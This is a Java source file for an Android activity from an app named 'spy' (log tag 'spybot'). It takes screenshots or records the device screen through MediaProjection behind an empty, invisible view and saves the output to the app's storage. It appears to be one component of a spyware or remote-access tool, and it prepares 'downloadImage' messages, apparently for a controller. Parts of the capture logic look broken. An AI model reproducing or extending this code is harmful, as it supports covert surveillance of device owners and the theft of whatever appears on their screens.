package com.example.spy.activities;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.OrientationEventListener;
import android.view.Surface;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.example.spy.R;
import com.example.spy.tasks.StreamScreen;
import com.example.spy.tasks.TakeScreenShot;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Objects;

public class ScreenProjectionActivity extends Activity {
    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    LayoutInflater li = (LayoutInflater) new AppController().getContext().getSystemService(Service.LAYOUT_INFLATER_SERVICE);

    //LinearLayout view = (LinearLayout) li.inflate(R.layout.overlay_1);

    @SuppressLint("NewApi")
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        File externalFilesDir = getExternalFilesDir(null);
        if (externalFilesDir != null) {

            if (getIntent().getBooleanExtra("streamScreen", false)) {

                mStoreDir = externalFilesDir.getAbsolutePath() + "/videorecords/";

            }else{

                mStoreDir = externalFilesDir.getAbsolutePath() + "/screenshots/";

            }


            File storeDirectory = new File(mStoreDir);
            if (!storeDirectory.exists()) {
                boolean success = storeDirectory.mkdirs();
                if (!success) {
                    Log.e("TAG", "failed to create file storage directory.");
                }
            }

        } else {
            Log.e("TAG", "failed to create file storage directory, getExternalFilesDir is null.");
        }


        TextView tv = new TextView(this);
        tv.setText("");
        setContentView(tv);

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager.isInteractive()) screenCast();
        else {
            JSONObject obj = new JSONObject();
            try {
                obj.put("name", "Screen Off");
                obj.put("image64", "null");
                obj.put("dataType", "downloadImage");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            super.onBackPressed();
        }
    }

    private void screenCast() {
        MediaProjectionManager mgr = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            mgr = (MediaProjectionManager) new AppController().getContext().getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mgr.createScreenCaptureIntent(), 7575);
        }
        //drawOverOtherApps()
    }




    private static int IMAGES_PRODUCED;

    private MediaProjection mMediaProjection;
    private String mStoreDir;
    private ImageReader mImageReader;
    private Display mDisplay;
    private VirtualDisplay mVirtualDisplay;
    private int mDensity;
    private int mWidth;
    private int mHeight;
    private int mRotation;
    private OrientationChangeCallback mOrientationChangeCallback;


    private MediaCodec.Callback encoderCallback;
    private static final String VIDEO_MIME_TYPE = "video/avc";
    private boolean mMuxerStarted = false;
    private Surface mInputSurface;
    private MediaMuxer mMuxer;
    private MediaCodec mVideoEncoder;
    private MediaCodec.BufferInfo mVideoBufferInfo;
    private int trackIndex = -1;



    private void startProjectionRecord(int resultCode, Intent data) {
        SystemClock.sleep(1000);
        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mMediaProjection == null) {
            mMediaProjection = mpManager.getMediaProjection(resultCode, data);
            if (mMediaProjection != null) {


                startRecording(); // defined below

                encoderCallback = new MediaCodec.Callback() {
                    @Override
                    public void onInputBufferAvailable(@NonNull MediaCodec codec, int index) {
                        Log.d("TAG", "Input Buffer Avail");
                    }

                    @Override
                    public void onOutputBufferAvailable(@NonNull MediaCodec codec, int index, @NonNull MediaCodec.BufferInfo info) {
                        ByteBuffer encodedData = mVideoEncoder.getOutputBuffer(index);
                        if (encodedData == null) {
                            throw new RuntimeException("couldn't fetch buffer at index " + index);
                        }

                        if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                            info.size = 0;
                        }

                        if (info.size != 0) {
                            if (mMuxerStarted) {
                                encodedData.position(info.offset);
                                encodedData.limit(info.offset + info.size);
                                mMuxer.writeSampleData(trackIndex, encodedData, info);
                            }
                        }

                        mVideoEncoder.releaseOutputBuffer(index, false);

                    }

                    @Override
                    public void onError(@NonNull MediaCodec codec, @NonNull MediaCodec.CodecException e) {
                        Log.e("TAG", "MediaCodec " + codec.getName() + " onError:", e);
                    }

                    @Override
                    public void onOutputFormatChanged(@NonNull MediaCodec codec, @NonNull MediaFormat format) {
                        Log.d("TAG", "Output Format changed");
                        if (trackIndex >= 0) {
                            throw new RuntimeException("format changed twice");
                        }
                        trackIndex = mMuxer.addTrack(mVideoEncoder.getOutputFormat());
                        if (!mMuxerStarted && trackIndex >= 0) {
                            mMuxer.start();
                            mMuxerStarted = true;
                        }
                    }
                };

            }
        }
    }



    private void startRecording() {
        DisplayManager dm = (DisplayManager)getSystemService(Context.DISPLAY_SERVICE);
        Display defaultDisplay = dm.getDisplay(Display.DEFAULT_DISPLAY);
        if (defaultDisplay == null) {
            throw new RuntimeException("No display found.");
        }

        try {

            mMuxer = new MediaMuxer(mStoreDir +"/myscreen_record.mp4", MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
        } catch (IOException ioe) {
            throw new RuntimeException("MediaMuxer creation failed", ioe);
        }

        // Get the display size and density.
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int screenWidth = metrics.widthPixels;
        int screenHeight = metrics.heightPixels;
        int screenDensity = metrics.densityDpi;

        prepareVideoEncoder(screenWidth, screenHeight);

        // Start the video input.
        mMediaProjection.createVirtualDisplay("Recording Display", screenWidth,
                screenHeight, screenDensity, 0 /* flags */, mInputSurface,
                null /* callback */, null /* handler */);

    }

    private void prepareVideoEncoder(int width, int height) {
        mVideoBufferInfo = new MediaCodec.BufferInfo();


        MediaFormat format = MediaFormat.createVideoFormat(VIDEO_MIME_TYPE, width, height);
        int frameRate = 30; // 30 fps

        // Set some required properties. The media codec may fail if these aren't defined.
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, 6000000); // 6Mbps
        format.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_CAPTURE_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_REPEAT_PREVIOUS_FRAME_AFTER, 1000000 / frameRate);
        format.setInteger(MediaFormat.KEY_CHANNEL_COUNT, 1);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1 seconds between I-frames

        // Create a MediaCodec encoder and configure it. Get a Surface we can use for recording into.
        try {
            mVideoEncoder = MediaCodec.createEncoderByType(VIDEO_MIME_TYPE);
            mVideoEncoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            mInputSurface = mVideoEncoder.createInputSurface();
            mVideoEncoder.setCallback(encoderCallback);
            mVideoEncoder.start();
        } catch (IOException e) {
            releaseEncoders();
        }
    }


    private void releaseEncoders() {
        if (mMuxer != null) {
            if (mMuxerStarted) {
                mMuxer.stop();
            }
            mMuxer.release();
            mMuxer = null;
            mMuxerStarted = false;
        }
        if (mVideoEncoder != null) {
            mVideoEncoder.stop();
            mVideoEncoder.release();
            mVideoEncoder = null;
        }
        if (mInputSurface != null) {
            mInputSurface.release();
            mInputSurface = null;
        }
        if (mMediaProjection != null) {
            mMediaProjection.stop();
            mMediaProjection = null;
        }
        mVideoBufferInfo = null;
        trackIndex = -1;
    }






    private void startProjectionScreenshoot(int resultCode, Intent data) {
        SystemClock.sleep(1000);
        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mMediaProjection == null) {
            mMediaProjection = mpManager.getMediaProjection(resultCode, data);
            if (mMediaProjection != null) {
                // display metrics
                mDensity = Resources.getSystem().getDisplayMetrics().densityDpi;
                WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                mDisplay = windowManager.getDefaultDisplay();

                // create virtual display depending on device width / height
                createVirtualDisplay();

                // register orientation change callback
                mOrientationChangeCallback = new OrientationChangeCallback(this);
                if (mOrientationChangeCallback.canDetectOrientation()) {
                    mOrientationChangeCallback.enable();
                }

                // register media projection stop callback
                mMediaProjection.registerCallback(new MediaProjectionStopCallback(),new Handler());

                mMediaProjection.stop();


            }
        }
    }


    @SuppressLint("WrongConstant")
    private void createVirtualDisplay() {
        // get width and height
        mWidth = Resources.getSystem().getDisplayMetrics().widthPixels;
        mHeight = Resources.getSystem().getDisplayMetrics().heightPixels;

        // start capture reader
        mImageReader = ImageReader.newInstance(mWidth, mHeight, PixelFormat.RGBA_8888, 2);
        mVirtualDisplay = mMediaProjection.createVirtualDisplay("screencap", mWidth, mHeight,
                mDensity, getVirtualDisplayFlags(), mImageReader.getSurface(), null, new Handler());
        mImageReader.setOnImageAvailableListener(new ImageAvailableListener(), new Handler());
    }

    private static int getVirtualDisplayFlags() {
        return DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    }

    private class ImageAvailableListener implements ImageReader.OnImageAvailableListener {
        @Override
        public void onImageAvailable(ImageReader reader) {

            FileOutputStream fos = null;
            Bitmap bitmap = null;
            try (Image image = mImageReader.acquireLatestImage()) {
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * mWidth;

                    // create bitmap
                    bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    // write bitmap to a file
                    fos = new FileOutputStream(mStoreDir + "/myscreen.png");
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);

                    IMAGES_PRODUCED++;
                    Log.e("TAG", "captured image: " + IMAGES_PRODUCED);


                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }

                if (bitmap != null) {
                    bitmap.recycle();
                }

            }
        }
    }

    private class OrientationChangeCallback extends OrientationEventListener {

        OrientationChangeCallback(Context context) {
            super(context);
        }

        @Override
        public void onOrientationChanged(int orientation) {
            final int rotation = mDisplay.getRotation();
            if (rotation != mRotation) {
                mRotation = rotation;
                try {
                    // clean up
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);

                    // re-create virtual display depending on device width / height
                    createVirtualDisplay();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private class MediaProjectionStopCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            Log.e("TAG", "stopping projection.");
            if (mVirtualDisplay != null) mVirtualDisplay.release();
            if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);
            if (mOrientationChangeCallback != null) mOrientationChangeCallback.disable();
            mMediaProjection.unregisterCallback(MediaProjectionStopCallback.this);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //windowManager.removeView(view)
        if (requestCode == 7575 && resultCode == RESULT_OK){

        }

        if (getIntent().getBooleanExtra("streamScreen", false)){


            startProjectionRecord(resultCode, data);


        }else{

            startProjectionScreenshoot(resultCode, data);


        }

        super.onBackPressed();
    }


}
